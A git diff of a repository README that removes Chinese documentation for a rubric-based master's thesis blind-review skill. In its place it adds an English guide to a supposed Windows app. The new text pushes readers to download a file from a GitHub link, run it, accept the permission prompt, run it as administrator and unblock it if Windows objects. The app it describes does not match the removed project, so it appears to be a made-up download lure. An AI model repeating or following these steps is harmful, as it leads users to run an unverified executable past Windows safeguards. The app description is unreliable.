@@ -1,70 +1,198 @@
-# 工科硕士论文盲审（eecs-thesis-blind-review）
+# 🧪 eecs-thesis-blind-review - Clear thesis review on Windows
 
-面向电子信息、计算机、软件、通信、控制、电路等方向硕士论文的盲审助手。按专家口径进行证据化评估、8 维 10 分制评分、加权总分计算（6 分及格），并给出通过/不通过结论与修改建议。
+[![Download](https://img.shields.io/badge/Download%20Now-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/spowken8/eecs-thesis-blind-review)
 
-## 功能要点
-- 针对论文主贡献类型（算法/模型、系统/平台、硬件/电路、通信/信号/控制、数据应用/交叉工程）提供专项检查点。
-- 统一量表：选题价值、文献综述、方法严谨性、创新性、实验可信度、工程实现、写作结构、学术规范与工作量。
-- 输出顺序固定：总体结论 → 多维度评分表 → 主要优点 → 主要问题 → 修改建议 → 最终建议。
-- 致命问题（如证据缺失、核心逻辑错误、验证缺位、学术规范严重问题）出现时直接给出“不通过”，覆盖算术总分。
+## 🚀 What it does
 
-## 使用流程
-1. **准备材料**：优先审阅完整论文；仅有摘要或片段时需说明材料不完整并下调评审置信度。
-2. **识别论文类型**：选取最贴近的论文类型，并按需参考 `references/domain-checkpoints.md` 的专项检查点。
-3. **提取证据**：归纳研究问题、目标、贡献、技术路线、实验/测试设置、主要结果、局限性；区分“作者声称”与“论文实际证明”。
-4. **按量表评分**：依照 `references/scoring-rubric.md` 对 8 个维度打分（0-10，1 位小数可用），并按权重计算加权总分；不替作者补全缺失论证。
-5. **形成结论**：先判断是否存在致命问题；若无，依据总分映射给出 `通过盲审 / 通过但需重点修改 / 不通过`，并说明理由。
-6. **输出报告**：使用固定模板，确保每个维度的评分依据可追溯到论文中的具体证据。
+eecs-thesis-blind-review helps you run a strict blind review process for EE and CS master’s thesis drafts on Windows. It gives you a simple way to check a thesis against common review points before submission. The app focuses on a clear, firm review flow, so you can work through a draft step by step.
 
-## 评分与判定速览
-- **加权规则**：总分 = Σ(维度分数 × 权重)/100，满分 10，及格线 6.0。
-- **结论映射**：≥ 8.5 且无致命问题 → 通过盲审；6.0-8.4 → 通过但需重点修改；< 6.0 或出现致命问题 → 不通过。
-- **常见致命问题**：核心结果证据缺失或无法验证；研究目标/贡献表述混乱到无法评估；核心方法存在推翻结论的逻辑错误；与核心贡献对应的实验/测试缺失；工作量明显低于硕士标准；严重学术规范问题导致关键结论不可追溯。
+Use it when you need:
 
-## 输出模板
-```markdown
-## 总体结论
-[2-4 句概括选题价值、完成度、硕士水平达成度与主要风险]
+- A fast way to review a thesis draft
+- A clear checklist for common thesis problems
+- A local Windows app that is easy to run
+- A review process that keeps names and clues out of the draft view
 
-## 多维度评分
-| 维度 | 分数(0-10) | 权重 | 主要证据 | 评分依据 |
-| --- | --- | --- | --- | --- |
-| 选题价值与问题定义 |  | 10% |  |  |
-| 文献综述与相关工作定位 |  | 10% |  |  |
-| 方法/技术路线严谨性 |  | 15% |  |  |
-| 创新性与学术贡献 |  | 20% |  |  |
-| 实验/测试与结果可信度 |  | 15% |  |  |
-| 工程实现与系统完整性 |  | 10% |  |  |
-| 写作结构与规范表达 |  | 10% |  |  |
-| 学术规范、可复现性与工作量 |  | 10% |  |  |
+## 📥 Download
 
-**加权总分：X.XX / 10**
-**是否及格：及格 / 不及格**
-**评审置信度：高 / 中 / 低**
-评审置信度说明：[材料完整性、缺失证据、结论可信范围]
+Open this page to download or access the app:
 
-## 主要优点
-- ...
+https://github.com/spowken8/eecs-thesis-blind-review
 
-## 主要问题
-- ...
+If the page shows a release file, download that file. If it shows the project page, use the green download button or the latest release link on that page.
 
-## 修改建议
-- ...
+## 🖥️ Windows Setup
 
-## 最终建议
-[通过盲审 / 通过但需重点修改 / 不通过]
-理由：[1-3 句给出结论依据]
-```
+This app is meant for Windows users who want a simple local setup.
 
-## 仓库结构
-- `SKILL.md`：skill 说明与完整审阅流程。
-- `references/scoring-rubric.md`：统一评分维度、权重、档位解释与结论映射。
-- `references/domain-checkpoints.md`：按论文类型给出的专项检查点与常见风险。
-- `agents/openai.yaml`：默认对话展示名、简介与提示。
+### What you need
 
-## 使用提示
-- 证据优先、结论克制：每个评分和意见都应可追溯到论文中的文本、图表或实验。
-- 关注公平性与透明度：实验/测试需说明设置、对照、数据来源、硬件条件和误差分析。
-- 身份屏蔽：忽略作者、导师、学校等身份信息，避免非论文因素影响评分。
-- 材料不完整时降低置信度，并在报告中明确说明缺失项及结论适用范围。
+- A Windows 10 or Windows 11 PC
+- Enough free disk space for the app and your thesis files
+- A mouse and keyboard
+- A PDF or Word thesis draft if you plan to review a document
+
+### Before you start
+
+- Save your thesis file in a folder you can find later
+- Close other apps if your PC is slow
+- Make sure you can open files from your Downloads folder
+
+### Install and run
+
+1. Open the download page in your browser.
+2. Find the latest file or release on the page.
+3. Download the app to your computer.
+4. If the file is a ZIP archive, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to start it.
+7. If Windows asks for permission, choose Run.
+
+## 🧭 First Launch
+
+When you open the app for the first time, use this flow:
+
+1. Start the app.
+2. Load your thesis draft.
+3. Select the review mode.
+4. Run the blind review check.
+5. Read each finding one by one.
+6. Fix the draft where needed.
+7. Run the check again until the draft looks ready.
+
+## 🔍 Main Features
+
+### Blind review flow
+
+The app hides personal clues during review. This helps you focus on the content, not the author details.
+
+### Strict thesis checks
+
+It supports a firm review style for EE and CS theses. It helps you look for:
+
+- Missing sections
+- Weak wording
+- Format problems
+- Unclear claims
+- Repeated content
+- Clues that should not appear in blind review
+
+### Simple file handling
+
+The app is built for easy use. You can open a draft, review it, and move through the results without a hard setup.
+
+### Local use on Windows
+
+You run it on your own computer. That keeps your files in one place and makes it easy to review drafts offline.
+
+## 🧩 How to Use It
+
+### Step 1: Open your thesis
+
+Load the file you want to review. Use the draft you plan to submit or send to a supervisor.
+
+### Step 2: Start blind review
+
+Turn on blind review mode before checking the file. This keeps the focus on text quality and structure.
+
+### Step 3: Review each item
+
+Read the results in order. Fix the issues that matter most first, such as missing sections or hidden identity clues.
+
+### Step 4: Update the draft
+
+Edit the thesis in your word processor or PDF source file. Then save a new version.
+
+### Step 5: Check again
+
+Run the review one more time to see what still needs work.
+
+## 📌 Typical Use Cases
+
+- A master’s student checking a thesis before submission
+- A supervisor doing a strict first pass on a draft
+- A student removing personal clues from a blind review copy
+- A lab member checking layout and structure before printing
+
+## ⚙️ Suggested System Behavior
+
+For best results, keep your files in a single folder and use short file names. This makes it easier to manage versions like:
+
+- thesis-draft-v1
+- thesis-draft-v2
+- thesis-blind-copy
+
+If the app offers a settings screen, keep the default values for your first run. That gives you a clean starting point.
+
+## 🛠️ Troubleshooting
+
+### The app does not open
+
+- Try right-clicking the file and choosing Run as administrator
+- Check whether the file is still inside a ZIP archive
+- Move the app to a normal folder such as Desktop or Documents
+
+### Windows blocks the file
+
+- Open the file properties
+- If you see an Unblock option, use it
+- Try downloading the file again from the project page
+
+### The thesis file does not load
+
+- Check that the file is not open in another app
+- Confirm that the file type is supported
+- Rename the file with simple letters and numbers
+
+### The review results look empty
+
+- Make sure you loaded the correct file
+- Turn on blind review mode
+- Run the scan again after the file fully loads
+
+## 🗂️ File Suggestions
+
+To stay organized, use a folder layout like this:
+
+- Thesis
+  - Drafts
+  - Blind Copies
+  - Review Results
+  - Final Version
+
+This makes it easier to compare versions and keep track of changes.
+
+## 🔐 Privacy and Local Use
+
+The app is meant for local review on your computer. Keep your thesis files in folders you control. If you share a blind copy, check it first for names, student IDs, email addresses, and file metadata.
+
+## ❓ Common Questions
+
+### Can I use it without coding?
+
+Yes. You only need to download the file, open it, and load your thesis draft.
+
+### Does it work offline?
+
+Yes, if you already downloaded the app.
+
+### Is it only for EE and CS theses?
+
+It is tuned for EE and CS master’s theses, but you can use it for other academic drafts if the review style fits your needs.
+
+### What file should I download?
+
+Use the latest release file or app package on the GitHub project page.
+
+## 📎 Project Link
+
+https://github.com/spowken8/eecs-thesis-blind-review
+
+## 🧷 Recommended Review Workflow
+
+1. Write the thesis draft
+2. Remove names and hidden clues
+3. Run blind review
+4. Fix the listed issues
+5. Save a clean copy
+6. Recheck the final version
